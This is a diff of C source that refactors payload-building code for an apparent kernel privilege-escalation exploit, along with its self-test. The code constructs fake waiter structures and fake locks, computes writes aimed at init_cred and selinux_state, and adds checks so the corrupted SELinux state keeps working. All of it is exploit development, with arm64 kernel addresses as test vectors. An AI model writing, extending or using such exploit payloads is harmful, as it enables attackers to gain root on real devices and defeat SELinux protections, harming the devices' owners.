@@ -28,7 +28,7 @@ PayloadWriteLayout payload_write_layout(
   return layout;
 }
 
-void build_tcp_zerocopy_payload(
+void build_compact_waiter_payload(
     unsigned char *waiter, const WriteRequest *request,
     const PayloadWriteLayout *layout) {
   if (layout->right) {
@@ -37,14 +37,25 @@ void build_tcp_zerocopy_payload(
     store64(waiter, 0x28, request->target);
     return;
   }
-  build_select_stack_payload(waiter, layout);
-}
-
-void build_select_stack_payload(
-    unsigned char *waiter, const PayloadWriteLayout *layout) {
   store64(waiter, 0x18, layout->parent);
   store64(waiter, 0x20, layout->right);
   store64(waiter, 0x28, layout->left);
+}
+
+int payload_write_layout_matches_request(
+    const WriteRequest *request, const PayloadWriteLayout *layout) {
+  if (!request || !layout || request->mode == WRITE_MODE_DISABLED) return 0;
+  return request->preserve_child ? layout->right != 0 : layout->right == 0;
+}
+
+int payload_write_layout_accepts_page(
+    const WriteRequest *request, const PayloadWriteLayout *layout) {
+  if (!payload_write_layout_matches_request(request, layout)) return 0;
+  /* W1 stores its page-derived value across selinux_state fields. An even
+   * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
+  if (request->mode == WRITE_MODE_ZERO && request->preserve_child &&
+      ((layout->right >> 16) & 1) == 0) return 0;
+  return 1;
 }
 
 void build_multicast_waiter_payload(
@@ -54,52 +65,50 @@ void build_multicast_waiter_payload(
   store64(buffer, waiter_offset + lock_offset, fake_lock);
 }
 
-static void legacy_compact_words(
-    unsigned char *waiter, uintptr_t target, int mode, int child,
-    int tcp_zerocopy, uintptr_t page_base, uintptr_t init_cred_alias) {
-  uintptr_t right = 0;
-  if (child) right = mode == 2 ? init_cred_alias : page_base + 0x100;
-  if (tcp_zerocopy && right) {
-    store64(waiter, 0x18, right);
-    store64(waiter, 0x20, 0);
-    store64(waiter, 0x28, target);
-  } else {
-    store64(waiter, 0x18, target - 8);
-    store64(waiter, 0x20, right);
-    store64(waiter, 0x28, 0);
-  }
+static uint64_t load64(const unsigned char *p, size_t off) {
+  uint64_t value;
+  memcpy(&value, p + off, sizeof(value));
+  return value;
 }
 
-int payload_builder_equivalence_test(void) {
+int payload_builder_fixed_vector_test(void) {
   static const struct {
     uintptr_t target;
     WriteMode mode;
     int leaf;
-    int tcp;
+    uintptr_t expected_pc;
+    uintptr_t expected_left;
   } vectors[] = {
-    {0xffffff8000123000ULL, WRITE_MODE_ZERO, 1, 0},
-    {0xffffff8000124000ULL, WRITE_MODE_ZERO, 0, 0},
-    {0xffffff8000125000ULL, WRITE_MODE_CREDENTIAL, 0, 0},
-    {0xffffff8000126000ULL, WRITE_MODE_CREDENTIAL, 0, 1},
+    {0xffffff8000123000ULL, WRITE_MODE_ZERO, 1,
+     0xffffff8000122ff8ULL, 0},
+    {0xffffff8000124000ULL, WRITE_MODE_ZERO, 0,
+     0xffffff8800210100ULL, 0xffffff8000124000ULL},
+    {0xffffff8000125000ULL, WRITE_MODE_CREDENTIAL, 0,
+     0xffffff802abfd588ULL, 0xffffff8000125000ULL},
   };
-  const uintptr_t page = 0xffffff8800200000ULL;
+  const uintptr_t page = 0xffffff8800210000ULL;
   const uintptr_t init_cred = 0xffffff802abfd588ULL;
   for (size_t i = 0; i < sizeof(vectors) / sizeof(vectors[0]); ++i) {
-    unsigned char legacy[0x30] = {0};
     unsigned char current[0x30] = {0};
     WriteRequest request = write_request_make(
         vectors[i].target, vectors[i].mode, vectors[i].leaf);
     PayloadWriteLayout layout = payload_write_layout(
         &request, page, 0x1111, 0x2222, init_cred);
-    legacy_compact_words(
-        legacy, vectors[i].target, vectors[i].mode, !vectors[i].leaf,
-        vectors[i].tcp, page, init_cred);
-    if (vectors[i].tcp)
-      build_tcp_zerocopy_payload(current, &request, &layout);
-    else
-      build_select_stack_payload(current, &layout);
-    if (memcmp(legacy, current, sizeof(legacy)) != 0) return 0;
+    build_compact_waiter_payload(current, &request, &layout);
+    if (load64(current, 0x18) != vectors[i].expected_pc ||
+        load64(current, 0x20) != 0 ||
+        load64(current, 0x28) != vectors[i].expected_left ||
+        !payload_write_layout_matches_request(&request, &layout) ||
+        !payload_write_layout_accepts_page(&request, &layout)) return 0;
   }
+  WriteRequest w1 = write_request_make(
+      0xffffff8000124000ULL, WRITE_MODE_ZERO, 0);
+  PayloadWriteLayout rejected = payload_write_layout(
+      &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
+  if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
+  rejected.right = 0;
+  if (payload_write_layout_matches_request(&w1, &rejected)) return 0;
+
   unsigned char legacy_stamp[0x80] = {0};
   unsigned char current_stamp[0x80] = {0};
   store64(legacy_stamp, 0x20 + 0x28, 0xffffff8800005800ULL);
